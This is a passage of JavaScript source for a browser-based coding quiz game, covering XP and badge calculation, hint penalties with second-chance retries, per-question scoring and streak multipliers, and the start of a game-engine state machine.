          } else if (diff === 'intermediate') {
            earnedXP += XP_RULES.intermediateCorrect;
          } else {
            earnedXP += XP_RULES.beginnerCorrect;
          }
        }
      });
    } else {
      // Fallback calculation using aggregate correct counts
      const diff = (summary.difficulty || 'beginner').toLowerCase();
      const perQuestion = diff === 'expert' ? XP_RULES.expertCorrect : diff === 'intermediate' ? XP_RULES.intermediateCorrect : XP_RULES.beginnerCorrect;
      earnedXP = (summary.questionsCorrect || 0) * perQuestion;
    }

    // Flawless stage bonus (100% accuracy in completed run with zero mistakes and zero retries)
    const isCompleted = summary.isCompleted !== false;
    const correct = summary.questionsCorrect !== undefined
      ? summary.questionsCorrect
      : (Array.isArray(results) ? results.filter(r => r && (r.isCorrect || r.correct)).length : 0);
    const total = summary.totalQuestions !== undefined
      ? summary.totalQuestions
      : (Array.isArray(results) ? results.length : 0);
    const incorrect = summary.incorrectCount !== undefined
      ? summary.incorrectCount
      : (summary.questionsAttempted !== undefined ? Math.max(0, summary.questionsAttempted - correct) : 0);
    const retries = summary.retriesUsedCount || summary.retriesUsed || 0;

    const isFlawless = total > 0 && correct === total && incorrect === 0 && retries === 0;
    if (isFlawless && isCompleted && total > 0) {
      earnedXP += XP_RULES.flawlessBonus;
    }

    // Daily Challenge clear bonus
    if ((summary.mode === 'daily' || summary.isDaily) && isCompleted) {
      earnedXP += XP_RULES.dailyClearBonus;
    }

    return Math.max(0, earnedXP);
  },

  /**
   * Evaluate unearned achievement badges against profile state and session summary.
   * @param {object} profile - Active profile state
   * @param {object} [sessionSummary=null] - Optional current session summary
   * @returns {Array<object>} Newly unlocked achievement badges
   */
  evaluateAchievements(profile, sessionSummary = null) {
    if (!profile) return [];

    const existingUnlocked = new Set([
      ...(profile.unlockedAchievements || []),
      ...(profile.badges || [])
    ].map(a => (typeof a === 'string' ? a : a.id)));

    const newlyUnlocked = [];

    for (const badge of ACHIEVEMENTS) {
      if (existingUnlocked.has(badge.id)) continue;

      try {
        const isSatisfied = badge.evaluate(profile, sessionSummary);
        if (isSatisfied) {
          newlyUnlocked.push({
            id: badge.id,
            name: badge.name,
            description: badge.description,
            icon: badge.icon,
            category: badge.category,
            unlockedAt: Date.now()
          });
        }
      } catch (err) {
        console.warn(`[Gamification] Error evaluating badge '${badge.id}':`, err);
      }
    }

    return newlyUnlocked;
  },

  /**
   * Determine available cosmetics and modes for a player level.
   * @param {number} level
   * @returns {{ themes: Array<string>, avatars: Array<string>, modes: Array<string> }}
   */
  getUnlockedRewards(level) {
    const lvl = Math.max(1, parseInt(level, 10) || 1);

    const themes = UNLOCKABLE_THEMES
      .filter(t => lvl >= t.requiredLevel)
      .map(t => t.id);

    const avatars = UNLOCKABLE_AVATARS
      .filter(a => lvl >= a.requiredLevel)
      .map(a => a.id);

    const modes = CHALLENGE_MODES
      .filter(m => lvl >= m.requiredLevel)
      .map(m => m.id);

    return { themes, avatars, modes };
  },

  /**
   * Check if a specific theme is unlocked for a given level.
   */
  isThemeUnlocked(themeId, level) {
    const theme = UNLOCKABLE_THEMES.find(t => t.id === themeId);
    if (!theme) return false;
    return (level || 1) >= theme.requiredLevel;
  },

  /**
   * Check if a specific avatar is unlocked for a given level.
   */
  isAvatarUnlocked(avatarId, level) {
    const avatar = UNLOCKABLE_AVATARS.find(a => a.id === avatarId);
    if (!avatar) return false;
    return (level || 1) >= avatar.requiredLevel;
  },

  /**
   * Check if a challenge mode is unlocked for a given level.
   */
  isModeUnlocked(modeId, level) {
    const mode = CHALLENGE_MODES.find(m => m.id === modeId);
    if (!mode) return false;
    return (level || 1) >= mode.requiredLevel;
  },

  /**
   * Master processing pipeline for verified session summaries.
   * Applies XP, evaluates level-up, updates streaks, grants badges, and guards against duplicate processing.
   *
   * @param {object} profile - Active player profile
   * @param {object} summary - Session summary from GameEngine
   * @returns {object} Processing result with rewards, level changes, and new achievements
   */
  processSessionSummary(profile, summary) {
    if (!profile || !summary) {
      return { success: false, error: 'Invalid profile or summary payload.' };
    }

    // 1. Idempotency Check: Reject already-processed session IDs
    const processedIds = new Set(profile.processedSessionIds || []);
    const sessionId = summary.sessionId || summary.id;

    if (sessionId && processedIds.has(sessionId)) {
      console.warn(`[Gamification] Session ${sessionId} already processed. Skipping duplicate reward calculation.`);
      return {
        success: true,
        isDuplicate: true,
        earnedXP: 0,
        xpEarned: 0,
        levelUp: false,
        newAchievements: [],
        newBadges: [],
        newRewards: { themes: [], avatars: [], modes: [] },
        unlockedThemes: [],
        unlockedAvatars: [],
        unlockedModes: [],
        updatedProfile: { ...profile }
      };
    }

    // 2. Check if this level was already cleared previously (Repeat cleared level check)
    const tierKey = `${(summary.language || 'python').toLowerCase()}_${(summary.difficulty || 'beginner').toLowerCase()}`;
    const alreadyCleared = Boolean(profile.completedTiers && profile.completedTiers[tierKey]);

    // On first clears, player receives 100% full milestone clear XP.
    // On repeat clears of an already completed tier, award 50% replay practice XP so players always progress!
    let rawEarnedXP = this.calculateSessionXP(summary);
    const isRepeatClear = alreadyCleared && summary.mode !== 'practice';
    const earnedXP = isRepeatClear ? Math.max(50, Math.round(rawEarnedXP * 0.5)) : rawEarnedXP;

    const initialSpendableXP = Math.max(0, profile.xp || 0);
    const initialLifetimeXP = typeof profile.lifetimeXP === 'number' ? profile.lifetimeXP : initialSpendableXP;

    const totalLifetimeXP = initialLifetimeXP + earnedXP;
    const totalSpendableXP = initialSpendableXP + earnedXP;
    const totalScore = (profile.totalScore || 0) + (summary.totalScore || 0);

    // 3. Derive Rank & Level based on LIFETIME XP (never decreases when points are spent on badges/avatars!)
    const prevLevelData = this.getLevelData(initialLifetimeXP);
    const newLevelData = this.getLevelData(totalLifetimeXP);
    const didLevelUp = newLevelData.level > prevLevelData.level;

    // 4. Update Cumulative Stats
    const prevStats = profile.stats || {};
    const attempted = summary.questionsAttempted || summary.totalQuestions || 0;
    const correct = summary.questionsCorrect || 0;
    // Derive best streak strictly based on continuous correct answers (Item 7)
    let maxContStreak = 0;
    if (Array.isArray(summary.results) && summary.results.length > 0) {
      let curCont = 0;
      for (const r of summary.results) {
        if (r && (r.isCorrect || r.correct) && !r.retried && (r.attempts === undefined || r.attempts <= 1)) {
          curCont++;
          if (curCont > maxContStreak) maxContStreak = curCont;
        } else {
          curCont = 0;
        }
      }
    }
    const sessionHighestStreak = maxContStreak > 0 ? maxContStreak : (summary.highestStreak || summary.bestStreak || 0);
    const currentHighestStreak = prevStats.highestStreak || profile.bestStreak || 0;
    const bestStreak = Math.max(currentHighestStreak, sessionHighestStreak);

    // If user takes a test ONLY on missed questions (retry_missed), do not alter existing stage accuracy stats
    const isRetryMissed = summary.mode === 'retry_missed' || Boolean(summary.isRetryMissed);

    const updatedStats = {
      ...prevStats,
      gamesPlayed: (prevStats.gamesPlayed || 0) + (isRetryMissed ? 0 : 1),
      questionsAttempted: (prevStats.questionsAttempted || 0) + (isRetryMissed ? 0 : attempted),
      questionsCorrect: (prevStats.questionsCorrect || 0) + (isRetryMissed ? 0 : correct),
      highestStreak: bestStreak
    };

    // 5. Update Campaign Progress & Stars
    const campaign = { ...(profile.campaign || {}) };
    const lang = summary.language || 'python';
    const diff = summary.difficulty || 'beginner';
    const accuracy = summary.accuracy || (attempted > 0 ? Math.round((correct / attempted) * 100) : 0);

    if (!isRetryMissed) {
      let starsEarned = 0;
      if (accuracy >= 90) starsEarned = 3;
      else if (accuracy >= 75) starsEarned = 2;
      else if (accuracy >= 60) starsEarned = 1;

      const langCampaign = { ...(campaign[lang] || { beginnerStars: 0, intermediateStars: 0, expertStars: 0, unlockedTier: 'beginner' }) };
      const starField = `${diff}Stars`;
      if (starsEarned > (langCampaign[starField] || 0)) {
        langCampaign[starField] = starsEarned;
      }

      // Tier advancement unlock logic
      if (diff === 'beginner' && accuracy >= 70 && langCampaign.unlockedTier === 'beginner') {
        langCampaign.unlockedTier = 'intermediate';
      } else if (diff === 'intermediate' && accuracy >= 75 && langCampaign.unlockedTier === 'intermediate') {
        langCampaign.unlockedTier = 'expert';
      }
      campaign[lang] = langCampaign;
    }

    // Track cleared tier in completedTiers
    const completedTiers = { ...(profile.completedTiers || {}) };
    if (!isRetryMissed && (accuracy >= 60 || summary.isCompleted)) {
      completedTiers[tierKey] = true;
    }

    // 6. Provisional Profile for Achievement Evaluation
    const provisionalProfile = {
      ...profile,
      xp: totalSpendableXP,
      lifetimeXP: totalLifetimeXP,
      totalScore: totalScore,
      level: newLevelData.level,
      rank: newLevelData.title,
      stats: updatedStats,
      campaign,
      completedTiers
    };

    // 7. Evaluate Achievements
    const newAchievements = this.evaluateAchievements(provisionalProfile, summary);

    // Merge existing + new achievements
    const existingAchievements = profile.unlockedAchievements || [];
    const mergedAchievements = [
      ...existingAchievements,
      ...newAchievements
    ];

    // 8. Track Session ID (Capped at 100 entries to prevent memory growth)
    const nextProcessedIds = [...(profile.processedSessionIds || [])];
    if (sessionId) {
      nextProcessedIds.push(sessionId);
      if (nextProcessedIds.length > 100) {
        nextProcessedIds.shift();
      }
    }

    // 9. Derive Rewards
    const unlockedRewards = this.getUnlockedRewards(newLevelData.level);

    // Newly unlocked cosmetics compared to previous level
    const prevUnlocked = this.getUnlockedRewards(prevLevelData.level);
    const newThemes = unlockedRewards.themes.filter(t => !prevUnlocked.themes.includes(t));
    const newAvatars = unlockedRewards.avatars.filter(a => !prevUnlocked.avatars.includes(a));
    const newModes = unlockedRewards.modes.filter(m => !prevUnlocked.modes.includes(m));

    const allBadgeIds = mergedAchievements.map(a => typeof a === 'string' ? a : a.id);

    // 10. Update session history & missed question inventory (capped at 50 sessions)
    const existingHistory = Array.isArray(profile.sessionHistory) ? profile.sessionHistory : [];
    const historyEntry = {
      sessionId: summary.sessionId || summary.id || `sess_${Date.now()}`,
      timestamp: summary.timestamp || Date.now(),
      language: summary.language || 'python',
      difficulty: summary.difficulty || 'beginner',
      mode: summary.mode || 'campaign',
      totalQuestions: summary.totalQuestions || 0,
      questionsAttempted: attempted,
      questionsCorrect: correct,
      incorrectCount: Math.max(0, attempted - correct),
      accuracy: accuracy,
      isRetry: isRetryMissed,
      isRetryMissed: isRetryMissed,
      totalScore: summary.totalScore || 0,
      earnedXP,
      bestStreak: sessionHighestStreak,
      hintsUsed: summary.hintsUsed || 0,
      retriesUsed: summary.retriesUsed || 0,
      isCompleted: summary.isCompleted !== false,
      isGameOver: Boolean(summary.isGameOver),
      missedQuestionIds: Array.isArray(summary.missedQuestionIds) ? summary.missedQuestionIds : [],
      results: Array.isArray(summary.results) ? summary.results : []
    };

    const nextHistory = [historyEntry, ...existingHistory].slice(0, 50);

    // Update missedQuestionIds: add missed from this session, remove solved correctly
    const currentMissed = new Set(profile.missedQuestionIds || []);
    if (Array.isArray(summary.missedQuestionIds)) {
      summary.missedQuestionIds.forEach(id => currentMissed.add(id));
    }
    if (Array.isArray(summary.results)) {
      summary.results.forEach(r => {
        if (r && (r.isCorrect || r.correct)) {
          currentMissed.delete(r.questionId || r.id);
        }
      });
    }

    const updatedProfile = {
      ...profile,
      xp: totalSpendableXP,
      lifetimeXP: totalLifetimeXP,
      totalScore: totalScore,
      level: newLevelData.level,
      rank: newLevelData.title,
      bestStreak: bestStreak,
      badges: allBadgeIds,
      stats: updatedStats,
      campaign,
      completedTiers,
      unlockedAchievements: mergedAchievements,
      processedSessionIds: nextProcessedIds,
      sessionHistory: nextHistory,
      missedQuestionIds: Array.from(currentMissed),
      unlockedThemes: unlockedRewards.themes,
      unlockedAvatars: unlockedRewards.avatars,
      unlockedModes: unlockedRewards.modes
    };

    const badgeIds = newAchievements.map(a => typeof a === 'string' ? a : a.id);
    return {
      success: true,
      isDuplicate: false,
      isRepeatClear,
      earnedXP,
      xpEarned: earnedXP,
      totalXP: totalSpendableXP,
      lifetimeXP: totalLifetimeXP,
      totalScore,
      prevLevel: prevLevelData.level,
      newLevel: newLevelData.level,
      rankTitle: newLevelData.title,
      levelUp: didLevelUp,
      newAchievements,
      newBadges: badgeIds,
      newRewards: {
        themes: newThemes,
        avatars: newAvatars,
        modes: newModes
      },
      unlockedThemes: newThemes,
      unlockedAvatars: newAvatars,
      unlockedModes: newModes,
      updatedProfile
    };
  },

  /**
   * Retrieve badge metadata definition by ID.
   * @param {string} badgeId
   * @returns {object|null}
   */
  getBadge(badgeId) {
    return ACHIEVEMENTS_MAP.get(badgeId) || null;
  },

  /**
   * Return all badges in registry.
   */
  getAllBadges() {
    return [...ACHIEVEMENTS];
  }
};

/* --- End of js/gamification.js --- */

/* --- Start of js/hint-manager.js --- */
/**
 * SyntaxArena Hint & Second-Chance Retry Manager (Batch 4)
 * Governs hint retrieval, scoring penalties, and Second-Chance retry eligibility.
 * Source of truth: docs/GAME_RULES.md (Sections 1.4 & ADR-07)
 */

var HINT_PENALTIES = window.HINT_PENALTIES = {
  beginner: 25,     // 25% of 100 base pts
  intermediate: 60, // 30% of 200 base pts
  expert: 100       // 33.3% of 300 base pts
};

var HintManager = window.HintManager = class HintManager {
  constructor() {
    this._usedHints = new Set(); // Stores question IDs where hint was requested
  }

  /**
   * Request a hint for a specific question.
   * @param {object} question
   * @returns {{ success: boolean, hint: string|null, penalty: number, message: string }}
   */
  requestHint(question) {
    if (!question || !question.id) {
      return { success: false, hint: null, penalty: 0, message: 'Invalid question.' };
    }

    const qId = question.id;
    const diff = (question.difficulty || 'beginner').toLowerCase();
    const penalty = HINT_PENALTIES[diff] || HINT_PENALTIES.beginner;

    // Hint already activated for this question (no double penalty)
    if (this._usedHints.has(qId)) {
      return {
        success: true,
        hint: question.hint || 'No additional clue available for this challenge.',
        penalty: 0,
        alreadyActive: true,
        message: 'Hint already unlocked for this challenge.'
      };
    }

    this._usedHints.add(qId);

    return {
      success: true,
      hint: question.hint || 'Review standard language specification for syntax rules.',
      penalty: penalty,
      alreadyActive: false,
      message: `Hint unlocked. Penalty: -${penalty} pts.`
    };
  }

  /**
   * Check if a hint was activated for a specific question.
   * @param {string} questionId
   * @returns {boolean}
   */
  hasUsedHint(questionId) {
    return this._usedHints.has(questionId);
  }

  /**
   * Determine if the player is eligible for a Second Chance retry.
   * Rule (ADR-07 & GAME_RULES.md §1.4):
   * A player is granted exactly ONE retry on an incorrect submission
   * IF AND ONLY IF they activated a Hint prior to submitting.
   * @param {string} questionId
   * @param {number} attemptCount - Number of attempts made so far
   * @returns {boolean}
   */
  canRetry(questionId, attemptCount) {
    if (attemptCount !== 1) return false;
    return this.hasUsedHint(questionId);
  }

  /**
   * Get standard hint penalty for a difficulty level.
   * @param {'beginner'|'intermediate'|'expert'} difficulty
   * @returns {number}
   */
  getPenaltyForDifficulty(difficulty) {
    const diff = (difficulty || 'beginner').toLowerCase();
    return HINT_PENALTIES[diff] || HINT_PENALTIES.beginner;
  }

  /**
   * Clear all hint tracking.
   */
  reset() {
    this._usedHints.clear();
  }
}

/* --- End of js/hint-manager.js --- */

/* --- Start of js/game-session.js --- */
/**
 * SyntaxArena Game Session Model (Batch 4)
 * Manages active session parameters, question shuffling, attempt history,
 * streak scaling, and deterministic scoring calculations.
 * Source of truth: docs/GAME_RULES.md & docs/ARCHITECTURE.md
 */



var BASE_POINTS = window.BASE_POINTS = {
  beginner: 100,
  intermediate: 200,
  expert: 300
};

var GameSession = window.GameSession = class GameSession {
  /**
   * @param {object} config
   * @param {string} config.language
   * @param {string} config.difficulty
   * @param {Array} config.questions
   * @param {'campaign'|'practice'} [config.mode='campaign']
   * @param {number} [config.timeLimit=45] - Total seconds per question (0 for untimed)
   * @param {boolean} [config.randomizeOrder=false]
   * @param {Function} [config.randomSource=Math.random]
   */
  constructor(config = {}) {
    if (!Array.isArray(config.questions) || config.questions.length === 0) {
      throw new Error('[GameSession] Cannot initialize session with empty questions array.');
    }

    this.id = Utils.generateId('sess');
    this.language = (config.language || 'python').toLowerCase();
    this.difficulty = (config.difficulty || 'beginner').toLowerCase();
    this.mode = config.mode || 'campaign';
    this.timeLimit = typeof config.timeLimit === 'number' ? config.timeLimit : 45;
    this.startTime = Date.now();
    this.endTime = null;
    this.isCompleted = false;

    // Clone question pool to prevent mutating source data
    const pool = config.questions.map(q => ({ ...q }));

    // Apply deterministic/seeded shuffling if requested (Practice mode)
    const randomFn = typeof config.randomSource === 'function' ? config.randomSource : Math.random;
    if (config.randomizeOrder) {
      for (let i = pool.length - 1; i > 0; i--) {
        const j = Math.floor(randomFn() * (i + 1));
        [pool[i], pool[j]] = [pool[j], pool[i]];
      }
    }

    this.questions = pool;
    this.currentIndex = 0;

    // Performance & Scoring State
    this.totalScore = 0;
    this.currentStreak = 0;
    this.highestStreak = 0;
    this.questionsCorrect = 0;
    this.questionsAttempted = 0;
    // Hardcore Mode parameters (3 Hearts, 30s timer per docs/GAME_RULES.md §5.1)
    this.lives = this.mode === 'hardcore' ? (typeof config.lives === 'number' ? config.lives : 3) : undefined;
    this.maxLives = this.mode === 'hardcore' ? (typeof config.maxLives === 'number' ? config.maxLives : 3) : undefined;
    this.isGameOver = false;
    if (this.mode === 'hardcore' && typeof config.timeLimit !== 'number') {
      this.timeLimit = 30;
    }

    // Tracking attempts and results per question
    this.hintsUsedCount = 0;
    this.retriesUsedCount = 0;
    this.attemptsMap = new Map();   // questionId -> count
    this.results = [];              // array of question outcomes
  }

  /**
   * Get the active question for the current step.
   * @returns {object|null}
   */
  getCurrentQuestion() {
    if (this.currentIndex >= this.questions.length) return null;
    return this.questions[this.currentIndex];
  }

  /**
   * Get the number of attempts made on the current question.
   * @returns {number}
   */
  getCurrentAttempts() {
    const q = this.getCurrentQuestion();
    if (!q) return 0;
    return this.attemptsMap.get(q.id) || 0;
  }

  /**
   * Increment attempt counter for current question.
   */
  recordAttempt() {
    const q = this.getCurrentQuestion();
    if (!q) return 0;
    const current = this.attemptsMap.get(q.id) || 0;
    const next = current + 1;
    this.attemptsMap.set(q.id, next);
    return next;
  }

  /**
   * Calculate points and streak for an answer outcome.
   * Master formula: docs/GAME_RULES.md §1.5
   * Points = max(0, floor((P_base * A - H + B_speed) * M(streak)))
   *
   * @param {boolean} isCorrect
   * @param {boolean} usedHint
   * @param {boolean} isRetry
   * @param {number} [timeRemaining=0]
   * @returns {object} Calculated outcome metrics
   */
  calculateOutcome(isCorrect, usedHint, isRetry, timeRemaining = 0) {
    const q = this.getCurrentQuestion();
    const diff = q ? (q.difficulty || this.difficulty) : this.difficulty;
    const basePts = BASE_POINTS[diff] || BASE_POINTS.beginner;

    if (!isCorrect) {
      // Incorrect answer breaks streak immediately
      this.currentStreak = 0;
      return {
        isCorrect: false,
        points: 0,
        basePoints: basePts,
        speedBonus: 0,
        hintPenalty: 0,
        retryModifier: isRetry ? 0.5 : 1.0,
        multiplier: 1.0,
        streak: 0,
        timeRemaining,
        timeLimit: this.timeLimit
      };
    }

    // Streak Multiplier: M = min(1.0 + (streak * 0.25), 3.0)
    // On Second Chance retry, streak is FROZEN (not incremented, not reset)
    let effectiveStreak = this.currentStreak;
    if (!isRetry) {
      effectiveStreak = this.currentStreak + 1;
      this.currentStreak = effectiveStreak;
      if (this.currentStreak > this.highestStreak) {
        this.highestStreak = this.currentStreak;
      }
    }
    const multiplier = Math.min(1.0 + (this.currentStreak * 0.25), 3.0);

    // Retry modifier (A): 1.0 on first try; 0.5 on retry
    const A = isRetry ? 0.5 : 1.0;

    // Hint penalty (H)
    const H = usedHint ? (HINT_PENALTIES[diff] || 25) : 0;

    // Speed bonus (B_speed): Awarded for rapid deduction proportional to remaining time
    let speedBonus = 0;
    if (!isRetry && !usedHint && this.timeLimit > 0 && timeRemaining > 0) {
      const speedRatio = Math.min(1.0, timeRemaining / this.timeLimit);
      speedBonus = Math.floor(0.5 * basePts * speedRatio);
    }

    // Master Points
    const subtotal = Math.max(0, basePts * A - H + speedBonus);
    const finalPoints = Math.max(0, Math.floor(subtotal * multiplier));

    return {
      isCorrect: true,
      points: finalPoints,
      basePoints: basePts,
      speedBonus: speedBonus,
      hintPenalty: H,
      retryModifier: A,
      multiplier: multiplier,
      streak: this.currentStreak,
      timeRemaining,
      timeLimit: this.timeLimit
    };
  }

  /**
   * Commit a question outcome to the session history.
   * @param {object} outcomeData
   */
  commitResult(outcomeData) {
    const q = this.getCurrentQuestion();
    if (!q) return;

    this.questionsAttempted++;
    if (outcomeData.isCorrect) {
      this.questionsCorrect++;
      this.totalScore += outcomeData.points;
    }
    if (outcomeData.usedHint) {
      this.hintsUsedCount++;
    }
    if (outcomeData.attempts > 1) {
      this.retriesUsedCount = (this.retriesUsedCount || 0) + 1;
    }

    this.results.push({
      questionId: q.id,
      index: this.currentIndex,
      type: q.type,
      topic: q.topic,
      subtopic: q.subtopic,
      difficulty: q.difficulty,
      prompt: q.prompt,
      code: q.code || '',
      options: Array.isArray(q.options) ? [...q.options] : [],
      correctAnswer: q.correctAnswer,
      explanation: q.explanation || '',
      timeRemaining: outcomeData.timeRemaining,
      timeLimit: this.timeLimit,
      ...outcomeData
    });

    // Hardcore mode life deduction: shatters 1 Heart upon failing question
    if (!outcomeData.isCorrect && this.mode === 'hardcore') {
      if (typeof this.lives === 'number') {
        this.lives = Math.max(0, this.lives - 1);
        if (this.lives <= 0) {
          this.isGameOver = true;
          this.isCompleted = true;
          this.endTime = Date.now();
        }
      }
    }
  }

  /**
   * Advance to the next question in the session.
   * @returns {boolean} True if advanced, false if at end
   */
  advance() {
    if (this.isGameOver) {
      this.isCompleted = true;
      this.endTime = this.endTime || Date.now();
      return false;
    }

    if (this.currentIndex < this.questions.length - 1) {
      this.currentIndex++;
      return true;
    } else {
      this.isCompleted = true;
      this.endTime = Date.now();
      return false;
    }
  }

  /**
   * Get structured session performance summary.
   * @returns {object}
   */
  getSummary() {
    const totalQuestions = this.questions.length;
    const accuracy = this.questionsAttempted > 0
      ? Math.round((this.questionsCorrect / this.questionsAttempted) * 100)
      : 0;

    const elapsedSeconds = Math.round(((this.endTime || Date.now()) - this.startTime) / 1000);
    const missedQuestionIds = this.results
      .filter(r => !r.isCorrect)
      .map(r => r.questionId);

    return {
      sessionId: this.id,
      language: this.language,
      difficulty: this.difficulty,
      mode: this.mode,
      lives: this.lives,
      maxLives: this.maxLives,
      isGameOver: Boolean(this.isGameOver),
      totalQuestions: totalQuestions,
      questionsAttempted: this.questionsAttempted,
      questionsCorrect: this.questionsCorrect,
      correctCount: this.questionsCorrect,
      incorrectCount: Math.max(0, this.questionsAttempted - this.questionsCorrect),
      accuracy: accuracy,
      accuracyPercentage: accuracy,
      totalScore: this.totalScore,
      highestStreak: this.highestStreak,
      bestStreak: this.highestStreak,
      hintsUsed: this.hintsUsedCount || 0,
      retriesUsed: this.retriesUsedCount || 0,
      elapsedSeconds: elapsedSeconds,
      timestamp: this.endTime || Date.now(),
      isCompleted: this.isCompleted,
      missedQuestionIds: missedQuestionIds,
      results: [...this.results]
    };
  }
}

/* --- End of js/game-session.js --- */

/* --- Start of js/game-engine.js --- */
/**
 * SyntaxArena Core Game Engine (Batch 4)
 * Orchestrates session lifecycles, explicit state transitions,
 * answer evaluation, hint gating, and progression events.
 * Source of truth: docs/GAME_RULES.md & docs/ARCHITECTURE.md
 */




var ENGINE_STATES = window.ENGINE_STATES = {
  IDLE: 'idle',
  ACTIVE: 'active',
  AWAITING_RETRY: 'awaiting-retry',
  SHOWING_EXPLANATION: 'showing-explanation',
  COMPLETED: 'completed'
};

var GameEngine = window.GameEngine = class GameEngine {
  constructor() {
    this._state = ENGINE_STATES.IDLE;
    this._session = null;
    this._hintManager = new HintManager();
    this._listeners = new Map();
  }

  /**
   * Current engine state machine phase.
   * @returns {'idle'|'active'|'awaiting-retry'|'showing-explanation'|'completed'}
   */
  getState() {
    return this._state;
  }

  /**
   * Retrieve active game session instance.
   * @returns {GameSession|null}
   */
  getSession() {
    return this._session;
  }

  /**
   * Start a new game session with configuration.
   * @param {object} config
   * @returns {object} Initial question payload
   */
  startSession(config) {
    if (!config || !Array.isArray(config.questions) || config.questions.length === 0) {
      throw new Error('[GameEngine.startSession] A non-empty questions array is required.');
    }

    this._session = new GameSession(config);
    this._hintManager.reset();
    this._transitionTo(ENGINE_STATES.ACTIVE, {
      questionIndex: 0,
      totalQuestions: this._session.questions.length
    });

    return this.getCurrentQuestion();
  }

  /**
   * Retrieve current question sanitized for player consumption.
   * Prevents revealing correctAnswer or explanation prematurely while active.
   * @returns {object|null}
   */
  getCurrentQuestion() {
    if (!this._session) return null;
    const raw = this._session.getCurrentQuestion();
    if (!raw) return null;

    const isRevealed = this._state === ENGINE_STATES.SHOWING_EXPLANATION ||
                       this._state === ENGINE_STATES.COMPLETED;

    return {
      id: raw.id,
      index: this._session.currentIndex,
      totalQuestions: this._session.questions.length,
      language: raw.language,
      difficulty: raw.difficulty,
      type: raw.type,
      topic: raw.topic,
      subtopic: raw.subtopic,
      standardVersion: raw.standardVersion,
      prompt: raw.prompt,
      code: raw.code,
      options: raw.options ? [...raw.options] : [],
      blankCount: raw.blankCount,
      targetLine: isRevealed ? raw.targetLine : undefined,
      correctAnswer: isRevealed ? raw.correctAnswer : undefined,
      explanation: isRevealed ? raw.explanation : undefined,
      hasUsedHint: this._hintManager.hasUsedHint(raw.id),
      attempts: this._session.getCurrentAttempts(),
      engineState: this._state,
      lives: this._session.lives,
      maxLives: this._session.maxLives,
      mode: this._session.mode,
      isGameOver: Boolean(this._session.isGameOver)
    };
  }

  /**
   * Request hint for the current active question.
   * @returns {{ success: boolean, hint: string|null, penalty: number, message: string }}
   */
  requestHint() {
    if (this._state !== ENGINE_STATES.ACTIVE && this._state !== ENGINE_STATES.AWAITING_RETRY) {
      return { success: false, hint: null, penalty: 0, message: 'Hint can only be requested on an active challenge.' };
    }

    const raw = this._session.getCurrentQuestion();
    if (!raw) {
      return { success: false, hint: null, penalty: 0, message: 'No active question.' };
    }

    if (this._session && this._session.mode === 'hardcore') {
      return { success: false, hint: null, penalty: 0, message: 'Hints are disabled in Hardcore mode!' };
    }

    const hintRes = this._hintManager.requestHint(raw);
    this._emit('hint:unlocked', { questionId: raw.id, penalty: hintRes.penalty });
    return hintRes;
  }

  /**
   * Submit an answer for the current question.
   * @param {any} submission - Selected option text, line number, or token
   * @param {number} [timeRemaining=0] - Seconds left on countdown timer
   * @returns {object} Outcome evaluation
   */
  submitAnswer(submission, timeRemaining = 0) {
    if (this._state !== ENGINE_STATES.ACTIVE && this._state !== ENGINE_STATES.AWAITING_RETRY) {
      throw new Error(`[GameEngine.submitAnswer] Submissions not permitted in state: ${this._state}`);
    }

    const raw = this._session.getCurrentQuestion();
    if (!raw) {
      throw new Error('[GameEngine.submitAnswer] No active question available.');
    }

    const attemptNumber = this._session.recordAttempt();
    const isRetry = attemptNumber > 1;
    const hasHint = this._hintManager.hasUsedHint(raw.id);

    // Evaluate answer through AnswerChecker
    const checkResult = AnswerChecker.check(raw, submission);

    if (checkResult.correct) {
      // Correct Submission: Calculate points, update streak, commit result
      const outcome = this._session.calculateOutcome(true, hasHint, isRetry, timeRemaining);
      this._session.commitResult({
        submission: checkResult.normalizedAnswer,
        attempts: attemptNumber,
        usedHint: hasHint,
        timeRemaining,
        ...outcome
      });

      this._transitionTo(ENGINE_STATES.SHOWING_EXPLANATION, { outcome });
      this._emit('answer:correct', { outcome, explanation: raw.explanation });

      return {
        correct: true,
        canRetry: false,
        points: outcome.points,
        basePoints: outcome.basePoints,
        speedBonus: outcome.speedBonus,
        hintPenalty: outcome.hintPenalty,
        multiplier: outcome.multiplier,
        streak: outcome.streak,
        explanation: raw.explanation,
        message: 'Correct answer!'
      };
    } else {
      // Incorrect Submission: Check Second Chance retry eligibility (disabled in Hardcore)
      const isHardcore = this._session.mode === 'hardcore';
      const canRetry = !isHardcore && this._hintManager.canRetry(raw.id, attemptNumber);

      if (canRetry) {
        // Player activated a hint prior to answering -> Grant 1 Second Chance retry!
        this._transitionTo(ENGINE_STATES.AWAITING_RETRY, { attemptNumber });
        this._emit('answer:retry_available', { questionId: raw.id, attempts: attemptNumber });

        return {
          correct: false,
          canRetry: true,
          points: 0,
          streak: this._session.currentStreak,
          explanation: null, // Do not reveal explanation on retry
          message: 'Incorrect. Second Chance retry unlocked because you activated a hint!'
        };
      } else {
        // No retry available (or retry already failed) -> Finalize question as incorrect
        const outcome = this._session.calculateOutcome(false, hasHint, isRetry, timeRemaining);
        this._session.commitResult({
          submission: checkResult.normalizedAnswer,
          attempts: attemptNumber,
          usedHint: hasHint,
          timeRemaining,
          ...outcome
        });

        // Hardcore Mode: Terminate session immediately upon zero hearts
        if (this._session.isGameOver) {
          this._transitionTo(ENGINE_STATES.COMPLETED, {
            gameOver: true,
            lives: this._session.lives,
            summary: this._session.getSummary()
          });
          this._emit('session:game_over', this._session.getSummary());

          return {
            correct: false,
            canRetry: false,
            gameOver: true,
            lives: 0,
            points: 0,
            streak: 0,
            correctAnswer: raw.correctAnswer,
            explanation: raw.explanation,
            message: 'GAME OVER! You lost all hearts.'
          };
        }

        this._transitionTo(ENGINE_STATES.SHOWING_EXPLANATION, { outcome });
        this._emit('answer:incorrect', {
          outcome,
          correctAnswer: raw.correctAnswer,
          explanation: raw.explanation
        });

        return {
          correct: false,
          canRetry: false,
          lives: this._session.lives,
          points: 0,
          basePoints: outcome.basePoints,
          speedBonus: 0,
          hintPenalty: 0,
          multiplier: 1.0,
          streak: 0,
          correctAnswer: raw.correctAnswer,
          explanation: raw.explanation,
          message: isHardcore ? `Incorrect! ${this._session.lives} heart(s) remaining.` : 'Incorrect answer.'
        };
      }
    }
  }

  /**
   * Advance to the next question in the session.
   * Can only be called while in SHOWING_EXPLANATION state.
   * @returns {{ advanced: boolean, completed: boolean, question: object|null }}
   */
  nextQuestion() {
    if (this._state !== ENGINE_STATES.SHOWING_EXPLANATION) {
